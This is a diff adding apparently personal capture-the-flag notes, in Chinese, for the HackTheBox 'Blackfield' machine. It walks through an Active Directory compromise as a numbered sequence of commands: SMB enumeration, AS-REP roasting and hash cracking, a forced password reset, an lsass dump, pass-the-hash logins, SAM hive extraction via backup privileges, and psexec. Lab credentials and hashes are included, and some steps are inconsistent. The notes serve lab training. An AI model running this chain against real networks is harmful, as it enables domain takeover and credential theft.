@@ -1,0 +1,61 @@
+nmap -sC -sV -Pn 10.129.1.243 > nmap.txt
+
+nmap --script vuln -sV -p 53,88,135,389,445,593,3268  -Pn  10.129.1.243  > nmapvuln.txt
+
+
+
+
+1.nmap掃描出samba服務,嘗試連接samba發現有幾個資料夾
+smbclient -L //10.129.1.243
+2.根據資料夾可以發現profile$資料夾可以登入並下載所有檔案下來
+mget *  recurse prompt
+3.根據資料夾名稱存成user.list使用kerbrute檢測有效用戶明
+/home/kali/.local/bin/kerbrute  -users user.list -password /usr/share/wordlists/rockyou.txt -domain BLACKFIELD.local
+[*] Valid user => audit2020
+[*] Valid user => support [NOT PREAUTH]
+[*] Valid user => svc_backup
+4.使用GetNPUser.py取得用戶密碼
+python2 GetNPUsers.py -dc-ip 10.129.136.105 -no-pass -usersfile /home/kali/timmy/hackthebox/Blackfield/dom_user blackfield/
+5.使用hash破解密碼,support #00^BlackKnight
+hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
+6.使用帳密登入samba查看內容
+smbmap -R  -H 10.129.136.105 -u  support  -p '#00^BlackKnight'
+7.使用帳號密碼登入rpcclient
+rpcclient -U support  10.129.136.105
+8.重置audit2020 密碼,23是選項代號,密碼必須有特殊字符及大小寫,否則會報錯(result was NT_STATUS_PASSWORD_RESTRICTION)
+setuserinfo2 audit2020 23 'Timmygood!'
+9.掛載forensic的forensic資料夾,下載
+sudo mount -t cifs -o 'username=audit2020,password=Timmygood!' //10.129.136.105/forensic /mnt
+10.使用pypykatz破解lsazip的密碼
+pypykatz lsa minidump lsass.DMP > lsass.out
+11.發現有ntlm帳密
+svc_backup:9658d1d1dcd9250115e2205d9f48400d
+Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+12.使用evil-winrm登入
+evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.129.136.105
+13.whoami發現有SeBackupPrivilege權限
+14.將sam備份到目錄下
+reg save hklm\sam C:\Users\svc_backup\Documents\sam.hive
+reg save hklm\system C:\Users\svc_backup\Documents\system.hive
+15.evil-winrm可以直接下載檔案到本地
+download system.hive download sam.hive
+16.使用pypykatz取得帳密訊息
+pypykatz registry --sam sam.hive system.hive
+
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 73d83e56de8961ca9f243e1a49638393
+============== SAM hive secrets ==============
+HBoot Key: 1d645695662cc2a70d54ee626104485110101010101010101010101010101010
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+17.使用Administraotor帳密透過evil-winrm登入
+upload pwn.txt
+diskshadow /s C:\temp\pwn.txt
+
+python3 ./psexec.py -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.129.136.105
